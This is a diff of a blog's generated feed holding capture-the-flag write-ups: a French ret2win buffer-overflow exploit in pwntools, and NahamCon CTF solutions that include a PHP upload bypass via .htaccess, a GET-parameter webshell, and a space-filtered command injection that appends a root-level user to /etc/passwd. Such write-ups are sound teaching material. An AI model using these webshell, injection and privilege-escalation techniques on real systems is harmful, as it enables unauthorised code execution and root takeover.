-<p><img alt="2023-01-13-194951_1041x663_scrot" src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png" alt="2023-01-13-194951_1041x663_scrot"></p>
 <p>En lisant ce que le programme écrit on apprend plusieurs choses:</p>
 <ul>
 <li>La taille du buffer où est stocké notre input: 32 bytes</li>
@@ -3980,8 +4088,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
 <p>L&rsquo;idée va donc être d&rsquo;ajouter l&rsquo;adresse de cette fonction à la fin de notre payload, pour qu&rsquo;elle finisse dans la sauvegarde de <code>rip</code></p>
 <blockquote>
-<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p>
-</blockquote>
+<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction à éxecuter. Ici, en réecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine étape du programme en lui faisant appeler une fonction qui ne devait jamais être appelée. On a donc modifié son <strong>flux d&rsquo;éxecution</strong>.</p></blockquote>
 <p>On peut compléter notre exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -4000,7 +4107,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
 </span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
-<p><img alt="2023-01-13-201012_1135x146_scrot" src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
 <p>Et&hellip; le flag n&rsquo;a pas été print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ultérieure à la 18.04 je suis affecté par les problèmes de <strong>stack alignment</strong> (MOVAPS)</p>
 <p>Pour régler ça, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code>, après notre padding</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
@@ -4025,7 +4132,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
-</span></span></code></pre></div><p><img alt="2023-01-13-201337_1023x371_scrot" src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png"></p>
+</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png" alt="2023-01-13-201337_1023x371_scrot"></p>
 <p>Et on a le flag, gg!</p>
 ]]></content>
         </item>
@@ -4041,7 +4148,7 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 
 Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go on the discord, in the &lt;a href=&#34;https://discord.com/channels/598608711186907146/1053097744241283142&#34;&gt;#nahamcon-ctf-general&lt;/a&gt; channel, and we can see this in the channel description&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;2022-12-17-172256_1335x78_scrot&#34; src=&#34;https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png&#34; alt=&#34;2022-12-17-172256_1335x78_scrot&#34;&gt;&lt;/p&gt;
 &lt;p&gt;flag → &lt;strong&gt;flag{a98373a74abb8c5ebb8f5192e034a91c}&lt;/strong&gt;&lt;/p&gt;
 &lt;h1 id=&#34;babys-first-heartbleed&#34;&gt;Baby’s First Heartbleed&lt;/h1&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971
@@ -4053,7 +4160,7 @@ Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
 
 Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
 </code></pre><p>Go on the discord, in the <a href="https://discord.com/channels/598608711186907146/1053097744241283142">#nahamcon-ctf-general</a> channel, and we can see this in the channel description</p>
-<p><img alt="2022-12-17-172256_1335x78_scrot" src="https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png" alt="2022-12-17-172256_1335x78_scrot"></p>
 <p>flag → <strong>flag{a98373a74abb8c5ebb8f5192e034a91c}</strong></p>
 <h1 id="babys-first-heartbleed">Baby’s First Heartbleed</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4063,14 +4170,14 @@ Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
 <p><code>⌨️ nc challenge.nahamcon.com 31985</code></p>
 <p>really guessed this one — when he asks for a string just type anything (like “<strong><strong><strong><strong><strong><strong><strong>hello”</strong></strong></strong></strong></strong></strong></strong> for example) and when he asks for a length, type a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>high number</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
 <p>You should see the flag appear in the server response:</p>
-<p><img alt="2022-12-17-172914_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268344-dc135f5b-8bca-43bb-b899-5c3ae30df6bc.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268344-dc135f5b-8bca-43bb-b899-5c3ae30df6bc.png" alt="2022-12-17-172914_1888x1032_scrot"></p>
 <p>flag → <strong>flag{bfca3d71260e581ba366dca054f5c8e5}</strong></p>
 <h1 id="read-the-rules">Read The Rules</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
 
 Please follow the rules for this CTF!
 </code></pre><p>Go to the <a href="https://ctf.nahamcon.com/rules">rules pages</a> and open up DevTools (or go to view-source) and you should find a comment with the flag at the very bottom of the page’s html</p>
-<p><img alt="2022-12-17-173352_943x617_scrot" src="https://user-images.githubusercontent.com/77807503/208268349-17827a40-0c4c-4502-bb87-ec932abbcd50.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268349-17827a40-0c4c-4502-bb87-ec932abbcd50.png" alt="2022-12-17-173352_943x617_scrot"></p>
 <p>flag → <strong>flag{90bc54705794a62015369fd8e86e557b}</strong></p>
 <h1 id="hashstation">Hashstation</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4079,7 +4186,7 @@ Below is a SHA256 hash! Can you determine what the original data was, before it 
 
 705db0603fd5431451dab1171b964b4bd575e2230f40f4c300d70df6e65f5f1c
 </code></pre><p>You could probably do it with hashcat, but i’m lazy so i’ll just use <a href="http://crackstation.net">crackstation.net</a></p>
-<p><img alt="2022-12-17-190623_1056x434_scrot" src="https://user-images.githubusercontent.com/77807503/208268371-e7fa0ef8-00f3-410f-8696-4396f4945dcf.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268371-e7fa0ef8-00f3-410f-8696-4396f4945dcf.png" alt="2022-12-17-190623_1056x434_scrot"></p>
 <p>flag → <strong><strong><strong><strong><strong>flag{awesome}</strong></strong></strong></strong></strong></p>
 <h1 id="catscii">Catscii</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4087,7 +4194,7 @@ Below is a SHA256 hash! Can you determine what the original data was, before it 
 Do you know what the cat command does in the Linux command-line?
 </code></pre><p>Download the file and cat its content</p>
 <p><code>⌨️ cat catscii</code></p>
-<p><img alt="2022-12-17-190848_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268377-98773958-b8a1-4888-8996-1ad12557f7d5.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268377-98773958-b8a1-4888-8996-1ad12557f7d5.png" alt="2022-12-17-190848_1888x1032_scrot"></p>
 <p>flag → <strong>flag{258da40ab06be7c99099d603a3b3ccb1}</strong></p>
 <h1 id="banjo">Banjo</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4095,14 +4202,14 @@ Do you know what the cat command does in the Linux command-line?
 Oooh, that classic twang! The banjo is one of my favorite strings instruments!
 </code></pre><p>Download the image, and use the <strong><strong><strong><strong><strong><strong><strong>strings</strong></strong></strong></strong></strong></strong></strong> command on it, then <strong><strong><strong><strong>grep flag</strong></strong></strong></strong></p>
 <p><code>⌨️ strings banjo.jpg | grep flag</code></p>
-<p><img alt="2022-12-17-191103_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268383-2e539cec-5632-4a7d-8594-9a741322edb6.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268383-2e539cec-5632-4a7d-8594-9a741322edb6.png" alt="2022-12-17-191103_1888x1032_scrot"></p>
 <p>flag → <strong>flag{ce4e687e575392ae242f0e41c888de11}</strong></p>
 <h1 id="arjeebee">Arjeebee</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
 
 What is the rgb(19,55,175) color in its hexadecimal representation?
 </code></pre><p>Go to <a href="https://www.rgbtohex.net/">rgbtohex.net</a> and enter the RGB values</p>
-<p><img alt="2022-12-17-191342_762x467_scrot" src="https://user-images.githubusercontent.com/77807503/208268387-601be543-3b43-404f-8a2f-8d755ac02d58.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268387-601be543-3b43-404f-8a2f-8d755ac02d58.png" alt="2022-12-17-191342_762x467_scrot"></p>
 <p>flag → flag{#1337AF}</p>
 <h1 id="way-2-basic">Way 2 Basic</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4111,7 +4218,7 @@ Here is some data represented in base 2. What is this data represented as ASCII 
 
 01100110 01101100 01100001 01100111 01111011 00111001 00110000 01100011 00110110 01100101 01100010 01100101 00111001 00110100 00110001 00110101 00110110 00110001 01100011 01100110 01100001 01100100 01100110 01100001 01100101 00110001 00110111 00110000 01100001 00111000 01100110 00110000 01100101 01100001 00110010 00110101 00110010 01111101
 </code></pre><p>Go to <a href="https://www.rapidtables.com/convert/number/binary-to-ascii.html">any binary to text website</a> (base 2 and binary are the same thing)</p>
-<p><img alt="2022-12-17-191609_646x566_scrot" src="https://user-images.githubusercontent.com/77807503/208268400-4c9af57c-7224-425b-a37e-d734dc4b89fc.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268400-4c9af57c-7224-425b-a37e-d734dc4b89fc.png" alt="2022-12-17-191609_646x566_scrot"></p>
 <p>flag → <strong>flag{90c6ebe941561cfadfae170a8f0ea252}</strong></p>
 <h1 id="byepass">Byepass</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4146,7 +4253,7 @@ Retrieve the flag out of the root of the filesystem /flag.txt.
 <p>First, let’s create a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> file, with our malicious code inside</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat ../../../../../flag.txt&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>Upload it, and read it by going to <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
-<p><img alt="2022-12-17-203048_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png" alt="2022-12-17-203048_930x1026_scrot"></p>
 <p>aaaaaand… it’s blank</p>
 <p>This can happen for two reasons:</p>
 <ul>
@@ -4159,10 +4266,10 @@ Retrieve the flag out of the root of the filesystem /flag.txt.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">AddType</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">php16</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">php_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">on</span>
 </span></span></code></pre></div><p>Upload dit, and read it by going to <strong><strong><strong>/.htaccess</strong></strong></strong></p>
-<p><img alt="2022-12-17-203816_929x261_scrot" src="https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png" alt="2022-12-17-203816_929x261_scrot"></p>
 <p>We get a 403 Forbidden response, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>which is a good sign</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, because by default, Apache prevents users from reading files such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
 <p>Now, let’s re-upload our <strong><strong><strong><strong><strong>php16</strong></strong></strong></strong></strong> file</p>
-<p><img alt="2022-12-17-204028_834x171_scrot" src="https://user-images.githubusercontent.com/77807503/208268416-303e5c36-bb7d-4646-b814-83652f92294f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268416-303e5c36-bb7d-4646-b814-83652f92294f.png" alt="2022-12-17-204028_834x171_scrot"></p>
 <p>The PHP is now executed and not read</p>
 <p>flag -&gt; <strong>flag{32697ad7acd2d4718758d9a5ee42965d}</strong></p>
 <h1 id="use-after-exit">Use After Exit</h1>
@@ -4212,14 +4319,14 @@ It&#39;s as easy as it looks, isn&#39;t it?
 </span></span></span></code></pre></div><p>which will look like this atfer decoding</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">^+</span><span style="color:#a6e22e">t</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>Now that we’ve got our webshell, we can get the flag from user’s home by navigating to <strong><strong><strong><strong>/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt</strong></strong></strong></strong></p>
-<p><img alt="2022-12-17-202338_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png" alt="2022-12-17-202338_930x1026_scrot"></p>
 <p>flag → <strong><strong><strong><strong><strong><strong>flag{ab5f69d6cc412345387a0ca3a4700398}</strong></strong></strong></strong></strong></strong></p>
 <h1 id="padlock">Padlock</h1>
 <pre tabindex="0"><code>Author: @birch#9901
 
 I forgot the combination to my pad lock :(
 </code></pre><p>First step is to run the binary, and see how it acts</p>
-<p><img alt="2022-12-17-230325_551x808_scrot" src="https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png" alt="2022-12-17-230325_551x808_scrot"></p>
 <p>It asks for a passcode, then probably compares it with the right passcode</p>
 <p>We’ll throw it into IDA, and press <strong><strong>F5</strong></strong> to generate a pseudocode</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
@@ -4290,7 +4397,7 @@ I forgot the combination to my pad lock :(
 </span></span></code></pre></div><p>We can see that it takes our input, “unleetifies” it (replaces 3 with e, spaces with _, 4 with a and 0 with o), compares it with the passcode and then calls the <strong><strong><strong><strong><strong><strong><strong><strong>unlock()</strong></strong></strong></strong></strong></strong></strong></strong> function</p>
 <p>So, we just have to run the binary and enter the following passcode:</p>
 <p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>m4st3r_l0cks_4r3nt_vry_str0ng_4r3_th3y</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
-<p><img alt="2022-12-17-231231_758x783_scrot" src="https://user-images.githubusercontent.com/77807503/208268433-7297da21-0953-4a8c-81e1-6db25c4188b4.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268433-7297da21-0953-4a8c-81e1-6db25c4188b4.png" alt="2022-12-17-231231_758x783_scrot"></p>
 <p>flag → <strong>flag{264cec034faef71c642de1721ea26b1f}</strong></p>
 <h1 id="the-space-between-us">The Space Between Us</h1>
 <pre tabindex="0"><code>Author: @JohnHammond#6971
@@ -4299,33 +4406,33 @@ I&#39;ve never felt this close to a character before. I hope the feeling is mutu
 
 Escalate your privileges and retrieve the flag out of root&#39;s home directory.
 </code></pre><p>When we connect to the machine using netcat, we see that every spaces are filtered in our commands:</p>
-<p><img alt="2022-12-17-231433_634x459_scrot" src="https://user-images.githubusercontent.com/77807503/208268435-08961a13-3c6a-4d94-a172-d356d9fcb606.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268435-08961a13-3c6a-4d94-a172-d356d9fcb606.png" alt="2022-12-17-231433_634x459_scrot"></p>
 <p>So, the first step is finding a way to execute commands with spaces</p>
 <p>And to do that, there is an environment variable that exists by default in linux: <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
 <p>For example, to execute <strong><strong><strong><strong><strong><strong>ls -la</strong></strong></strong></strong></strong></strong>, we will have to write <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>ls${IFS}-la</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
 <p>Now that we know this, we can list the content of the folder</p>
-<p><img alt="2022-12-17-231629_567x259_scrot" src="https://user-images.githubusercontent.com/77807503/208268441-0a174e6c-90e2-42cd-b40b-5cd5c1d450ae.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268441-0a174e6c-90e2-42cd-b40b-5cd5c1d450ae.png" alt="2022-12-17-231629_567x259_scrot"></p>
 <p>We can see a <strong><strong><strong><strong><strong><strong><strong><strong><strong>README.md</strong></strong></strong></strong></strong></strong></strong></strong></strong> file, let’s take a look at it</p>
-<p><img alt="2022-12-17-231714_494x197_scrot" src="https://user-images.githubusercontent.com/77807503/208268447-6667c331-b64d-4329-8d76-ee4f4a9c82f4.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268447-6667c331-b64d-4329-8d76-ee4f4a9c82f4.png" alt="2022-12-17-231714_494x197_scrot"></p>
 <p>It says that there is a misconfiguration in the filesystem, so we can start taking a look around</p>
 <p>After spending a good hour enumerating every files and their permissions, I see that the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/etc/passwd</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> is writable</p>
-<p><img alt="2022-12-17-231901_556x99_scrot" src="https://user-images.githubusercontent.com/77807503/208268453-d9048712-2fc6-4709-9d19-1e8b10cb6e3f.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268453-d9048712-2fc6-4709-9d19-1e8b10cb6e3f.png" alt="2022-12-17-231901_556x99_scrot"></p>
 <p>We are going to add a user to the file, who’s home directory will be <strong><strong><strong><strong><strong>/root</strong></strong></strong></strong></strong></p>
 <p>First, we need to generate a password hash for the user</p>
 <p><code>⌨️ openssl passwd hack</code></p>
 <p>Then, add a new line to the <strong><strong><strong><strong><strong><strong>passwd</strong></strong></strong></strong></strong></strong> file using echo (because nano &amp; vim arent working)</p>
 <p><code>⌨️ echo${IFS}&quot;hacker:ZUVbo0DtkXUXw:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></p>
-<p><img alt="2022-12-17-182345_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268459-7a396236-e4e3-4cbe-b17a-b272225c6241.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268459-7a396236-e4e3-4cbe-b17a-b272225c6241.png" alt="2022-12-17-182345_1888x1032_scrot"></p>
 <p>Of course, we still can’t use spaces so we use <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
 <p>Now, we can read <strong><strong><strong><strong><strong><strong><strong><strong>/root/flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> as this user using <strong><strong><strong>su</strong></strong></strong></p>
 <p><code>⌨️ echo${IFS}hack${IFS}|${IFS}su${IFS}-${IFS}hacker${IFS}-c${IFS}&quot;cat&lt;/root/flag.txt”</code></p>
-<p><img alt="2022-12-17-182532_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268465-f4b92ff5-3ff2-47fa-b4f0-6f06026ff481.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268465-f4b92ff5-3ff2-47fa-b4f0-6f06026ff481.png" alt="2022-12-17-182532_1888x1032_scrot"></p>
 <p>flag → <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>flag{59af40c07bc6f02b457aa4c15543da2d}</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
 <h1 id="conclusion">Conclusion</h1>
 <p>I globally liked this CTF, there were some very interesting rooms and I learned new things so that’s a W</p>
 <p>Thanks to everyone who participated and to my tm8 b0unce</p>
-<p><img alt="certificate" src="https://user-images.githubusercontent.com/77807503/208268486-dbb01cf2-d9fe-4558-ba25-322bd76d1aad.png"></p>
-<p><img alt="2022-12-17-232956_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268490-01653d9d-3f6c-4d60-a146-08cdf933b7cb.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268486-dbb01cf2-d9fe-4558-ba25-322bd76d1aad.png" alt="certificate"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/208268490-01653d9d-3f6c-4d60-a146-08cdf933b7cb.png" alt="2022-12-17-232956_1888x1032_scrot"></p>
 <p>1479 pts - 53/1658 (my username at the time was 99makarov)</p>
 ]]></content>
         </item>
